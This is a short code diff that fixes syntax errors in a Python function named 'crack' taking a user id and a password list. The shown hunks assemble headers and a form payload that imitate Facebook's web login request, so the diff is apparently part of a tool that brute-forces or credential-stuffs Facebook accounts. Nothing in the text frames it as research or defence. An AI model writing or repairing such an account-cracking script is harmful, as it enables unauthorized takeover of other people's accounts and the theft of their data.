@@ -152,7 +152,7 @@ def crack(uid, password_list, total_count):
             'sec-fetch-dest': 'empty',
             'referer': 'https://www.facebook.com/?_rdr',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',}
-            {
+            data = {
     'av': '0',
     'aaid': '0',
     'user': '0',
@@ -179,7 +179,7 @@ def crack(uid, password_list, total_count):
     'fb_api_caller_class': 'RelayModern',
     'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
     'server_timestamps': 'true',
-    'variables': json.dumps{
+    'variables': json.dumps({
         "input": {
             "actor_id": "0",
             "client_mutation_id": "2",
@@ -226,7 +226,7 @@ def crack(uid, password_list, total_count):
         "trusted_device_records": "{}",
         "use_uid_to_login": False,
         "waterfall_id": "ad8438a3-c020-4019-97f2-ec5687242d8e"
-    },
+    }),
     'doc_id': '9807605492696448',
     'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]',
 }
